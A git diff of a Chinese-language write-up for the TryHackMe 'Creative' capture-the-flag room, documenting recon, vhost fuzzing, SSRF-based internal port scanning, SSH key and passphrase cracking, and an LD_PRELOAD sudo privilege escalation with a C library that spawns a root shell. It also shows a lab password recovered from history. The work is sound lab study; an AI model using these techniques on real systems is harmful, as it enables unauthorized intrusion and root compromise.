@@ -12,6 +12,8 @@ tags: TryHackMe-Challenge Writeup
 ### Intro
 本篇是關於TryHackMe上的Challenge: [Creative](https://tryhackme.com/room/creative) 我的解題思路和歷程，紀錄自己嘗試了哪些手段以及學習了哪些新的攻擊手法和切入角度
 
+
+
 ### Step 1. Nmap
 
 ```bash
@@ -46,6 +48,9 @@ Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 -
 
 - 檢查80
 
+
+
+
 ### Step 2. Web
 - 發現幾位開發者名字可能有用，先記起來
 - 用 whatweb 跑跑看:
@@ -62,7 +67,7 @@ http://creative.thm [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@exampl
 └─# gobuster dir -u creative.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html
 ```
 
-- 嘗試 subdomain 枚舉，因爲發現其實原本的網站域名是 creative.thm 還可以有子域名，發現一堆結果但是有一個返回的頁面跟別的不同: `beta.creative.thm`
+- 嘗試 vhost 枚舉，因爲發現其實原本的FQDN是 creative.thm 可能還有底下的虛擬主機，發現一堆結果但是有一個返回的頁面跟別的不同: `beta.creative.thm`
 
 ```bash
 └─# ffuf -u http://10.10.255.41 -H "Host: FUZZ.creative.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r -c
@@ -79,17 +84,84 @@ shop                    [Status: 200, Size: 37589, Words: 14867, Lines: 686, Dur
 ...
 ```
 
-### Step 3. Web(beta)
 
 
 
-### 自我總結
+### Step 3. Web(beta.creative.thm)
+- 網站提供了一個 URL tester 的功能，直覺就是可能有SSRF的漏洞存在
+- 手動試了一些最基礎的SSRF都發現行不通: `beta.example.com/../../../` 和 `beta.example.com/assets`
+- 試試看 seclist 中 fuzzing 相關的字典檔:
+    - seclists/Fuzzing/command-injection-commix.txt
+    - seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
+    - seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+- 發現全部都是一致的回應，那麼再測測看Server底下有沒有開其他port的web: 建立一個字典檔從1～65536，並ffuf做模糊測試: `ffuf -X POST -u http://beta.creative.thm -w ports.txt -d "url=http://127.0.0.1:FUZZ/" -H "Content-Type: application/x-www-form-urlencoded" -fw 3`
+- 發現除了80之外還有一個**port 1337**
+- 瀏覽器打開後發現應該是從根目錄(/)的Web Server，首先肯定關注 /home 目錄，發現除了用戶 ubuntu 還有用戶 **saad**，最後可獲得ssh私鑰，但發現需要 passphrase
+- 用 ssh2john 破解 ssh passphrase: **s.......s**
+- 成功獲得 user flag
+
+
+
+
+### Step 4. 提權
+- 首先跑linpeas看看有什麼攻擊角度
+
+```bash
+╔══════════╣ Searching passwords in history files
+sudo -l                                                                           
+echo "saad:MyStrongestPasswordYet$4291" > creds.txt
+sudo -l
+sudo -l
+mysql -u root -p
+mysql -u root
+sudo su
+ssh root@192.169.155.104
+mysql -u user -p
+mysql -u db_user -p
+ls -ld /var/lib/mysql
+```
+
+- 發現有一個 creds.txt 文件並且它應該是藏在某個 saad 讀不到的文件夾內，但我們可以知道 saad 用戶密碼。況且我們可以知道 sudo -l 可能是攻擊角度
+
+```bash
+saad@ip-10-10-177-196:/tmp$ sudo -l
+[sudo] password for saad: 
+Matching Defaults entries for saad on ip-10-10-177-196:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on ip-10-10-177-196:
+    (root) /usr/bin/ping
+```
+
+- ping 有 sudo 權限，但通過 GTFOBins 查詢卻沒辦法利用。但同時我還發現在sudo -l的結果中有一個 `env_keep+=LD_PRELOAD` 很奇怪，通過查詢確實可以利用這個設置和 (root)/usr/bin/ping 提權，以下步驟出自[這篇文章](https://www.cnblogs.com/backlion/p/10503985.html)
+    - 創建一個 shell.c:
+    ```C
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+    void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/sh");
+    }
+    ```
+    - 根據這個shell.c創建一個library:shell.so: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+    - 最後執行 `sudo LD_PRELOAD=/tmp/shell.so ping` 即可獲得 root shell
+
+
+
+### 總結
+自己卡關的步驟:
+- 枚舉虛擬主機
+- SSRF => 枚舉開放port
+- 新的提權手法: `env_keep+=LD_PRELOAD`
 
 
 ## 學習資料
-1. [TryHackMe Challenge: Opacity](https://tryhackme.com/room/opacity)
-2. [Writeup 1: Opacity](https://github.com/0xDeco/CTF-Notes/tree/main/Opacity)
-3. [Writeup 2: Opacity](https://www.youtube.com/watch?v=oTWxXR7QywY)
+1. [TryHackMe Challenge: Creative](https://tryhackme.com/room/creative)
+2. [Writeup \| Creative](https://0xb0b.gitbook.io/writeups/tryhackme/2024/creative)
+3. [使用LD_Preload的Linux权限升级技巧](https://www.cnblogs.com/backlion/p/10503985.html)
 
 </div>
 </body>
